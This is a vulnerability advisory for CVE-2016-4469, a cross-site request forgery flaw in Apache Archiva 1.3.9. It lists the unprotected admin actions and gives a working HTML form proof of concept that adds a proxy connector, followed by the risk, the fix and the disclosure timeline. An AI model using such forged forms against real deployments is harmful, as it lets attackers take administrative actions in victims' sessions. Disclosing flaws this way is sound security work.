@@ -1,0 +1,138 @@
+RCE Security Advisory
+https://www.rcesecurity.com
+
+
+1. ADVISORY INFORMATION
+=======================
+Product:        Apache Archiva
+Vendor URL:     https://archiva.apache.org
+Type:           Cross-Site Request Forgery [CWE-253]
+Date found:     2016-05-31
+Date published: 2016-07-11
+CVSSv3 Score:   5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)
+CVE:            CVE-2016-4469
+
+
+2. CREDITS
+==========
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+
+
+3. VERSIONS AFFECTED
+====================
+Apache Archiva v1.3.9
+older versions may be affected too.
+
+
+4. INTRODUCTION
+===============
+Apache Archiva™ is an extensible repository management software that helps
+taking care of your own personal or enterprise-wide build artifact
+repository. It is the perfect companion for build tools such as Maven,
+Continuum, and ANT.
+
+(from the vendor's homepage)
+
+
+5. VULNERABILITY DETAILS
+========================
+The application basically offers a Cross-Site Request Forgery protection
+using the a Struts-based token called "token". While many administrative
+functionalities like adding new users are protected on this way, the
+following HTTP POST-based functions are missing this token and are
+therefore vulnerable to CSRF:
+
+Adding new repository proxy connectors:
+/archiva/admin/addProxyConnector_commit.action
+
+Adding new repositories:
+/archiva/admin/addRepository_commit.action
+
+Editing existing repositories:
+/archiva/admin/editRepository_commit.action
+
+Adding legacy artifact paths:
+/archiva/admin/addLegacyArtifactPath_commit.action
+
+Changing the organizational appearance:
+/archiva/admin/saveAppearance.action
+
+Uploading new artifacts:
+/archiva/upload_submit.action
+
+
+The following Proof-of-Concept triggers this vulnerability and adds a new
+proxy connector called "CSRF":
+
+
+<html>
+  <body>
+    <form
+action="http://localhost:8080/archiva/admin/addProxyConnector_commit.action"
+method="POST">
+      <input type="hidden" name="pattern" value="" />
+      <input type="hidden" name="connector&#46;order" value="0" />
+      <input type="hidden" name="connector&#46;proxyId"
+value="&#40;direct&#32;connection&#41;" />
+      <input type="hidden" name="connector&#46;sourceRepoId" value="CSRF" />
+      <input type="hidden" name="connector&#46;targetRepoId"
+value="maven2&#45;repository&#46;dev&#46;java&#46;net" />
+      <input type="hidden"
+name="connector&#46;policies&#91;&apos;propagate&#45;errors&#45;on&#45;update&apos;&#93;"
+value="always" />
+      <input type="hidden"
+name="connector&#46;policies&#91;&apos;cache&#45;failures&apos;&#93;"
+value="no" />
+      <input type="hidden"
+name="connector&#46;policies&#91;&apos;releases&apos;&#93;"
+value="always" />
+      <input type="hidden"
+name="connector&#46;policies&#91;&apos;propagate&#45;errors&apos;&#93;"
+value="stop" />
+      <input type="hidden"
+name="connector&#46;policies&#91;&apos;checksum&apos;&#93;" value="fail" />
+      <input type="hidden"
+name="connector&#46;policies&#91;&apos;snapshots&apos;&#93;"
+value="always" />
+      <input type="hidden" name="propertyKey" value="" />
+      <input type="hidden" name="propertyValue" value="" />
+      <input type="hidden" name="blackListPattern" value="" />
+      <input type="hidden" name="whiteListPattern" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+6. RISK
+=======
+To successfully exploit this vulnerability a user with administrative rights
+must be tricked into visiting an arbitrary website while having an
+authenticated session in the application.
+
+The vulnerability allows remote attackers to perform sensitive
+administrative actions like adding new repository proxy connectors, adding
+new repositories, editing existing repositories, adding legacy artifact
+paths, changing the organizational appearance or uploading new artifacts in
+the authentication context of the targeted user.
+
+
+7. SOLUTION
+===========
+Upgrade/Migrate to Apache Archiva 2.2.1
+
+
+8. REPORT TIMELINE
+==================
+2016-05-31: Discovery of the vulnerability
+2016-05-31: Notified vendor via public security mail address
+2016-06-06: No response, sent out another notification
+2016-06-10: Vendor states that this version is out of support
+2016-06-21: Vendor assigns CVE-2016-4469
+2016-07-11: Advisory released
+
+
+9. REFERENCES
+=============
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4469
